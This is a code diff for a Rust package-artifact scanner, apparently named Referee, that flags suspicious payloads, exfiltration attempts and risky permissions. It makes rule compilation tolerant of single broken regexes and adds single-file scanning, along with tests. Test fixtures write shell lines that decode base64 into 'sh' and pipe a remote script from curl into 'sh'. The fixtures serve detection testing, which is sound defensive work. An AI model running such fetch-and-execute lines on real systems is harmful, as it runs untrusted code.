@@ -315,6 +315,17 @@ const AUTORUN_NAMES: &[&str] = &[
 pub struct ArtifactScanner {
     patterns: RegexSet,
     rules: Vec<(ScanRule, ScanSeverity)>,
+    /// The rule table `patterns` was built from. [`PATTERNS`] in production;
+    /// held rather than referenced directly so a test can build a scanner
+    /// over a table with a deliberately broken rule.
+    table: &'static [Pattern],
+    /// `slots[i]` is the `table` index of the expression in `RegexSet` slot
+    /// `i`. A `RegexSet` reports *its own* indices, which stop lining up with
+    /// the table as soon as one expression is left out of it, so every match
+    /// index is translated through this before anything is looked up.
+    slots: Vec<usize>,
+    /// Labels of the rules whose expression failed to compile.
+    uncompiled: Vec<&'static str>,
 }
 
 impl Default for ArtifactScanner {
@@ -325,27 +336,73 @@ impl Default for ArtifactScanner {
 
 impl ArtifactScanner {
     pub fn new() -> Self {
-        let expressions: Vec<String> = PATTERNS
+        Self::from_table(PATTERNS)
+    }
+
+    /// Build a scanner over a rule table, losing only the rules that fail.
+    ///
+    /// Every pattern in [`PATTERNS`] is a literal in this file, so a failure
+    /// here is a programming error, not a runtime condition. But one typo must
+    /// cost one rule, not all of them: the whole set is compiled first as the
+    /// fast path, and only if that fails is each expression compiled on its
+    /// own and the set rebuilt from the ones that work. Each lost rule is named
+    /// at `warn`, which is visible at the default log level on every command
+    /// that builds a scanner — a scanner that silently checks less than it
+    /// claims is the failure Referee exists to prevent.
+    fn from_table(table: &'static [Pattern]) -> Self {
+        let expressions: Vec<String> = table
             .iter()
             .map(|pattern| format!("(?i){}", pattern.regex))
             .collect();
 
-        // Every pattern in the table is a literal in this file, so a failure
-        // here is a programming error, not a runtime condition. Falling back to
-        // an empty set keeps a typo from taking the whole command down with it,
-        // and says so loudly.
-        let patterns = RegexSet::new(&expressions).unwrap_or_else(|e| {
-            tracing::debug!("referee: scan patterns failed to compile: {}", e);
-            RegexSet::empty()
-        });
+        let (patterns, slots, uncompiled) = match RegexSet::new(&expressions) {
+            Ok(set) => (set, (0..table.len()).collect(), Vec::new()),
+            Err(_) => {
+                let mut slots = Vec::new();
+                let mut uncompiled = Vec::new();
+                for (index, expression) in expressions.iter().enumerate() {
+                    match regex::Regex::new(expression) {
+                        Ok(_) => slots.push(index),
+                        Err(e) => {
+                            tracing::warn!(
+                                "referee: scan rule {} ({}) failed to compile and is disabled: {}",
+                                table[index].rule.label(),
+                                table[index].regex,
+                                e
+                            );
+                            uncompiled.push(table[index].rule.label());
+                        }
+                    }
+                }
+                let subset = slots.iter().map(|&index| &expressions[index]);
+                let set = RegexSet::new(subset).unwrap_or_else(|e| {
+                    // Every member compiled on its own, so this is a size
+                    // limit rather than a syntax error.
+                    tracing::warn!("referee: scan rules failed to compile as a set: {}", e);
+                    RegexSet::empty()
+                });
+                (set, slots, uncompiled)
+            }
+        };
 
         Self {
             patterns,
-            rules: PATTERNS
+            rules: table
                 .iter()
                 .map(|pattern| (pattern.rule, pattern.severity))
                 .collect(),
+            table,
+            slots,
+            uncompiled,
         }
+    }
+
+    /// Labels of the rules whose expression failed to compile. Empty in a
+    /// healthy build; a test pins it that way. The constructor's `warn` is
+    /// what reaches users, so this is read only by that test.
+    #[allow(dead_code)]
+    pub fn uncompiled_rules(&self) -> &[&'static str] {
+        &self.uncompiled
     }
 
     /// Scan an extracted package tree, worst findings first.
@@ -368,10 +425,37 @@ impl ArtifactScanner {
             );
         }
 
-        findings.sort_by_key(|finding| match finding.severity {
-            ScanSeverity::Block => 0,
-            ScanSeverity::Warn => 1,
-        });
+        sort_findings(&mut findings);
+        findings
+    }
+
+    /// Scan a single file, with the same rules and limits as a tree scan.
+    ///
+    /// Used where the artifact is one known file rather than an extracted
+    /// archive — the binary `cargo build --release` produced. The file is
+    /// reported relative to its own directory, exactly as a tree scan rooted
+    /// there would report it. A symlink or anything that is not a regular file
+    /// is not followed, matching the walker.
+    pub fn scan_file_at(&self, path: &Path) -> Vec<ScanFinding> {
+        let mut findings = Vec::new();
+        let mut budget = Budget::default();
+
+        let metadata = match fs::symlink_metadata(path) {
+            Ok(metadata) if metadata.is_file() => metadata,
+            Ok(_) => {
+                tracing::debug!("referee: {} is not a regular file", path.display());
+                return findings;
+            }
+            Err(e) => {
+                tracing::debug!("referee: cannot read {}: {}", path.display(), e);
+                return findings;
+            }
+        };
+
+        let root = path.parent().unwrap_or(path);
+        self.visit_file(root, path, &metadata, &mut findings, &mut budget);
+
+        sort_findings(&mut findings);
         findings
     }
 
@@ -423,17 +507,32 @@ impl ArtifactScanner {
                 continue;
             }
 
-            budget.files += 1;
-            if budget.files > MAX_FILES || budget.bytes > MAX_TOTAL_BYTES {
-                budget.exhausted = true;
-                return;
-            }
-
-            self.scan_file(root, &path, metadata.len(), findings, budget);
-
-            #[cfg(unix)]
-            self.check_permissions(root, &path, &metadata, findings);
+            self.visit_file(root, &path, &metadata, findings, budget);
         }
+    }
+
+    /// Everything the walker does to one regular file: budget accounting, the
+    /// rule pass, and the Unix permission check. Shared with
+    /// [`Self::scan_file_at`] so a single-file scan cannot drift from a tree
+    /// scan.
+    fn visit_file(
+        &self,
+        root: &Path,
+        path: &Path,
+        metadata: &fs::Metadata,
+        findings: &mut Vec<ScanFinding>,
+        budget: &mut Budget,
+    ) {
+        budget.files += 1;
+        if budget.files > MAX_FILES || budget.bytes > MAX_TOTAL_BYTES {
+            budget.exhausted = true;
+            return;
+        }
+
+        self.scan_file(root, path, metadata.len(), findings, budget);
+
+        #[cfg(unix)]
+        self.check_permissions(root, path, metadata, findings);
     }
 
     fn scan_file(
@@ -504,13 +603,20 @@ impl ArtifactScanner {
     fn match_patterns(&self, text: &str) -> Vec<(ScanRule, ScanSeverity, String)> {
         let mut seen: HashMap<&'static str, (ScanRule, ScanSeverity, String)> = HashMap::new();
 
-        for index in self.patterns.matches(text).into_iter() {
+        for slot in self.patterns.matches(text).into_iter() {
+            // Translate the set's own index into a table index before either
+            // lookup. Using `slot` directly would attribute a match to the
+            // wrong rule as soon as any rule was left out of the set.
+            let index = match self.slots.get(slot) {
+                Some(&index) => index,
+                None => continue,
+            };
             let (rule, severity) = match self.rules.get(index) {
                 Some(entry) => *entry,
                 None => continue,
             };
 
-            let evidence = evidence_for(text, PATTERNS[index].regex);
+            let evidence = evidence_for(text, self.table[index].regex);
             seen.entry(rule.label())
                 .and_modify(|existing| {
                     // A blocking hit outranks a warning one for the same rule.
@@ -743,6 +849,17 @@ pub fn shannon_entropy(bytes: &[u8]) -> f64 {
             -p * p.log2()
         })
         .sum()
+}
+
+/// Order findings worst-first, keeping discovery order within a severity.
+///
+/// Callers that add findings after a scan — the VirusTotal enrichment — sort
+/// again afterwards, or a late block lands behind every warning.
+pub(crate) fn sort_findings(findings: &mut [ScanFinding]) {
+    findings.sort_by_key(|finding| match finding.severity {
+        ScanSeverity::Block => 0,
+        ScanSeverity::Warn => 1,
+    });
 }
 
 /// Quote the text that tripped a pattern.
@@ -1284,5 +1401,112 @@ mod tests {
         assert!(scan(&dir).is_empty());
         let _ = fs::remove_dir_all(&dir);
         let _ = fs::remove_dir_all(&outside);
+    }
+
+    #[test]
+    fn test_every_rule_pattern_compiles() {
+        // Pins the table: a broken rule only warns at runtime, so CI is
+        // where it has to fail.
+        assert!(ArtifactScanner::new().uncompiled_rules().is_empty());
+    }
+
+    /// A table with a broken rule between two working ones, so every working
+    /// rule after the broken one sits in a different `RegexSet` slot than its
+    /// table index.
+    static BROKEN_TABLE: &[Pattern] = &[
+        Pattern {
+            regex: r"blockmarker",
+            rule: ScanRule::SuspiciousPayload,
+            severity: ScanSeverity::Block,
+        },
+        Pattern {
+            regex: r"(unclosed",
+            rule: ScanRule::HighEntropy,
+            severity: ScanSeverity::Block,
+        },
+        Pattern {
+            regex: r"warnmarker",
+            rule: ScanRule::ExfilAttempt,
+            severity: ScanSeverity::Warn,
+        },
+    ];
+
+    #[test]
+    fn test_a_broken_rule_costs_only_that_rule() {
+        let scanner = ArtifactScanner::from_table(BROKEN_TABLE);
+        assert_eq!(scanner.uncompiled_rules(), ["high-entropy"]);
+
+        let found = scanner.match_patterns("x BLOCKMARKER y warnmarker z");
+        assert_eq!(found.len(), 2);
+    }
+
+    #[test]
+    fn test_subset_match_indices_are_translated_to_the_table() {
+        let scanner = ArtifactScanner::from_table(BROKEN_TABLE);
+
+        // Only the third rule matches. Untranslated, its slot (1) would be
+        // read as the broken high-entropy block rule.
+        let found = scanner.match_patterns("only warnmarker here");
+        assert_eq!(found.len(), 1);
+        let (rule, severity, evidence) = &found[0];
+        assert_eq!(*rule, ScanRule::ExfilAttempt);
+        assert_eq!(*severity, ScanSeverity::Warn);
+        assert_eq!(evidence, "warnmarker");
+    }
+
+    #[test]
+    fn test_single_file_scan_matches_a_tree_scan_of_its_directory() {
+        let dir = scratch("single");
+        let file = write(
+            &dir,
+            "tool.sh",
+            "#!/bin/sh\necho aGVsbG8gd29ybGQ= | base64 -d | sh\ncurl -fsSL https://x.io/i.sh | sh\n",
+        );
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            fs::set_permissions(&file, fs::Permissions::from_mode(0o4777)).unwrap();
+        }
+
+        let describe = |findings: Vec<ScanFinding>| -> Vec<String> {
+            findings.iter().map(ScanFinding::describe).collect()
+        };
+        let single = describe(ArtifactScanner::new().scan_file_at(&file));
+        assert!(!single.is_empty());
+        assert_eq!(single, describe(scan(&dir)));
+
+        let _ = fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn test_single_file_scan_does_not_follow_a_symlink() {
+        #[cfg(unix)]
+        {
+            let dir = scratch("single_link");
+            let target = write(&dir, "real.sh", "echo aGVsbG8= | base64 -d | sh\n");
+            let link = dir.join("link");
+            std::os::unix::fs::symlink(&target, &link).unwrap();
+            assert!(ArtifactScanner::new().scan_file_at(&link).is_empty());
+            let _ = fs::remove_dir_all(&dir);
+        }
+    }
+
+    #[test]
+    fn test_sort_findings_puts_blocks_first_and_is_stable() {
+        let finding = |severity, evidence: &str| ScanFinding {
+            path: PathBuf::from("f"),
+            rule: ScanRule::SuspiciousPayload,
+            severity,
+            evidence: evidence.to_string(),
+        };
+        let mut findings = vec![
+            finding(ScanSeverity::Warn, "w1"),
+            finding(ScanSeverity::Block, "b1"),
+            finding(ScanSeverity::Warn, "w2"),
+            finding(ScanSeverity::Block, "b2"),
+        ];
+        sort_findings(&mut findings);
+        let order: Vec<_> = findings.iter().map(|f| f.evidence.as_str()).collect();
+        assert_eq!(order, ["b1", "b2", "w1", "w2"]);
     }
 }
